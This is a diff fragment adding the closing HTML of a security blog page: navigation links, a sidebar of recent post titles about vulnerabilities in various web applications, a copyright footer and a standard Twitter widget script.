+        <a class="basic-alignment left" href="/blog/2012/08/09/solving-pwn0s-v2/" title="Previous Post: solving pwn0s v2">&laquo; solving pwn0s v2</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2013/04/21/motorola-surfboard-multiple-vulnerabilities/" title="Next Post: Motorola Surfboard - Multiple Vulnerabilities">Motorola Surfboard - Multiple Vulnerabilities &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/03/02/introduction/">introduction</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/02/24/ganib-project-management-2.3-sqli/">ganib project management 2.3 SQLi</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/01/26/fetching-jboss-mbean-method-hashes/">Fetching JBoss MBean method hashes</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/10/14/dolibarr-3.4.0-multiple-vulnerabilities/">Dolibarr 3.4.0 - Multiple Vulnerabilities</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/07/28/openemm-2013-soap-sqli-slash-stored-xss/">OpenEMM-2013 SOAP SQLi/Stored XSS</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - Bryan Alexander -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a> | Themed with <a href="https://github.com/lucaslew/whitespace">Whitespace</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
